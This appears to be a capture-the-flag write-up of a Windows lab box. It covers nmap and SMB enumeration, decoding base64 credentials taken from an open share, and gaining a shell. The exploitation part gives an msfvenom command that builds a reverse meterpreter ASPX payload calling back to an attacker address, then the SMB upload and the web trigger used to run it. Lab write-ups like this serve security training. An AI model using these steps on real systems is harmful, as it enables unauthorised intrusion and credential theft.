# Enumeration 
## Starting with `nmap`
```python
nmap -T4 -sV -vv -O -A -Pn 10.10.156.23 -oN nmap.txt
```
I found these interesting information
```note
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack ttl 127 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
...
```
Nothing much so I tried to access the target website and it looked like this
![Image](https://github.com/user-attachments/assets/552a041d-659e-4f11-8a09-6ba308a64185)
![Image](https://github.com/user-attachments/assets/cc79aad6-1a22-4c2b-8b18-8974be3f515c)
## Moving on with `Gobuster` to discover hidden path
![Image](https://github.com/user-attachments/assets/afe7677f-45d4-4170-a24e-7d13ee8075e2)
Still, I hadn't found any thing interested
## Checking the `smbclient`
```python
smbclient -L  \\\10.10.156.23\\        
Password for [WORKGROUP\b0xb0x]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.156.23 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
I found the sharename `nt4wrksv`, so I attempted interacting with that sharename to dive deeper

```python
smbclient  \\\\10.10.156.23\\nt4wrksv
Password for [WORKGROUP\b0xb0x]:
Try "help" to get a list of possible commands.
smb: \> get password.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \password.txt
smb: \> ls
  .                                   D        0  Sun Jul 26 07:46:04 2020
  ..                                  D        0  Sun Jul 26 07:46:04 2020
  passwords.txt                       A       98  Sun Jul 26 01:15:33 2020
get pass
                7735807 blocks of size 4096. 5136836 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Amazing, I got the `passwords.txt` file, check what are inside the file
```python
cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
It contained encoded users and passwords? First, I had to decode these strings first, decode the first line first
![Image](https://github.com/user-attachments/assets/01642ed9-32f0-43e8-8976-74854344c8b0)
After that, the second line
![Image](https://github.com/user-attachments/assets/926570d5-e8e9-4e90-8e52-f7a08b95b9fa)
So I got two usernames and passwords.
Then run a Nmap vulnerability scan on port 139 and 445 to enumerate this service. Command use:
```python
nmap -T4 -sV --script vuln -p 139,445 10.10.83.126
```
The results
```note
...

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
...
```
Next step is searching for SMBv1 
However, I found nothing, I had to enumerate more
I reckoned that there were still many hidden ports beside those common ones 
So I checked all the hidden port via this command
```python
nmap -T4 -sV -vv -O -A -p- 10.10.225.34
```
Results:
```note

```
The port 49663 was running on http.
Accessing this port 49663
![Image](https://github.com/user-attachments/assets/383e06e9-1fd4-44f5-8feb-3ef8c783fbf7)
Nothing special for this one so I tried the directory of the smb group and found this
![Image](https://github.com/user-attachments/assets/0f841027-bb53-469d-bbe0-1fd13f8cf6d1)
Therefore, implementing a reverse meterpreter for this port is the best way via generating payload and upload that payload under the name Bill or Bob 
```note
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.23.99.113 LPORT=1234 -f aspx -o metx64.aspx
```
```note
smbclient   \\\\10.10.225.34\\nt4wrksv -U Bill
Password for [WORKGROUP\Bill]:
Try "help" to get a list of possible commands.
smb: \> put metx64.aspx
putting file metx64.aspx as \metx64.aspx (3.2 kb/s) (average 3.2 kb/s)
```
Setting up a multi/handler to recieve the connection
![Image](https://github.com/user-attachments/assets/697351cf-5ef0-4706-8635-ac820428f6a3)
First, trigger the payload by accessing to it via port 49663
![Image](https://github.com/user-attachments/assets/f7df8b06-9071-4bd9-9ef0-916673f5ad22)
Got the user flag
![Image](https://github.com/user-attachments/assets/6986c040-aeed-49fa-b23b-9215dc342966)

